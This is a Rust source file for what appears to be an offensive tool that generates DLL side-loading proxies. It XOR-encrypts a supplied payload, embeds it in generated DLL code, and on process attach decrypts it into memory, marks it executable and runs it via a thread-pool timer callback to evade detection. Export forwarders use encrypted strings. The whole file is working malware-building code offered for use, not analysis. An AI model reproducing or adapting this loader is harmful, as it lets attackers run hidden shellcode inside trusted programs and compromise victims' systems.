use std::env;
use std::fs;
use std::path::Path;

fn encrypt_payload(data: &[u8]) -> (Vec<u8>, u8) {
    let key = 0xAA; // Simple XOR key for demonstration
    let enc: Vec<u8> = data.iter().map(|b| b ^ key).collect();
    (enc, key)
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 4 {
        println!("Usage: orchestra-side-load-gen <target_dll_name> <export1,Ordinal_5,...> <payload_file>");
        return;
    }
    let target_dll = &args[1];
    let exports: Vec<&str> = args[2].split(',').collect();
    let payload_path = &args[3];

    let payload = fs::read(payload_path).expect("Failed to read payload");
    let (enc_payload, key) = encrypt_payload(&payload);

    let mut stubs = String::new();
    let mut def_entries = String::new();

    for export in exports {
        if export.starts_with("Ordinal_") {
            let ordinal_num = export.replace("Ordinal_", "");
            def_entries.push_str(&format!("  {} @{} NONAME\n", export, ordinal_num));
            stubs.push_str(&format!(
                r#"
#[no_mangle]
pub unsafe extern "system" fn {}() {{
    // Ordinal forward stub
}}
"#,
                export
            ));
        } else {
            def_entries.push_str(&format!("  {}\n", export));
            stubs.push_str(&format!(
                r#"
#[no_mangle]
pub unsafe extern "system" fn {}() {{
    let real_dll = string_crypt::enc_str!("real_{}");
    let export_name = string_crypt::enc_str!("{}");
    
    let lib = winapi::um::libloaderapi::LoadLibraryA(real_dll.as_ptr() as _);
    if !lib.is_null() {{
        let proc = winapi::um::libloaderapi::GetProcAddress(lib, export_name.as_ptr() as _);
        if !proc.is_null() {{
            let f: extern "system" fn() = std::mem::transmute(proc);
            f();
        }}
    }}
}}
"#,
                export, target_dll, export
            ));
        }
    }

    let payload_bytes_str = enc_payload
        .iter()
        .map(|b| format!("0x{:02X}", b))
        .collect::<Vec<_>>()
        .join(", ");

    let code = format!(
        r#"
// auto-generated DLL side-loading forwarder
use winapi::um::winnt::DLL_PROCESS_ATTACH;
use winapi::um::libloaderapi::DisableThreadLibraryCalls;
use winapi::shared::minwindef::{{HINSTANCE, DWORD, LPVOID}};
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::winnt::{{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ}};

{}

extern "system" fn payload_callback(param: LPVOID, _timer_or_wait_fired: winapi::um::winnt::BOOLEAN) {{
    unsafe {{
        let run: extern "C" fn() = std::mem::transmute(param);
        run();
    }}
}}

#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn DllMain(hinst: HINSTANCE, reason: DWORD, _reserved: LPVOID) -> i32 {{
    if reason == DLL_PROCESS_ATTACH {{
        unsafe {{ DisableThreadLibraryCalls(hinst); }}
        
        let enc_payload: [u8; {}] = [{}];
        let key: u8 = 0x{:02X};
        
        let mut dec_payload = enc_payload;
        for byte in dec_payload.iter_mut() {{
            *byte ^= key;
        }}

        unsafe {{
            let mem = VirtualAlloc(
                std::ptr::null_mut(),
                dec_payload.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            
            if !mem.is_null() {{
                std::ptr::copy_nonoverlapping(dec_payload.as_ptr(), mem as _, dec_payload.len());
                
                let mut old_protect = 0;
                winapi::um::memoryapi::VirtualProtect(
                    mem, 
                    dec_payload.len(), 
                    PAGE_EXECUTE_READ, 
                    &mut old_protect
                );

                // Queue via Threadpool instead of direct thread
                let mut timer: winapi::shared::ntdef::HANDLE = std::ptr::null_mut();
                winapi::um::threadpoollegacyapiset::CreateTimerQueueTimer(
                    &mut timer, 
                    std::ptr::null_mut(), 
                    Some(payload_callback), 
                    mem as LPVOID, 
                    0, 
                    0, 
                    winapi::um::winnt::WT_EXECUTEINTIMERTHREAD
                );
            }}
        }}
    }}
    1
}}
"#,
        stubs,
        enc_payload.len(),
        payload_bytes_str,
        key
    );

    fs::write("side_loaded.rs", code).unwrap();
    let def_content = format!("LIBRARY {}\nEXPORTS\n{}", target_dll, def_entries);
    fs::write("side_loaded.def", def_content).unwrap();
    println!(
        "Generated side_loaded.rs and side_loaded.def for {}",
        target_dll
    );
}
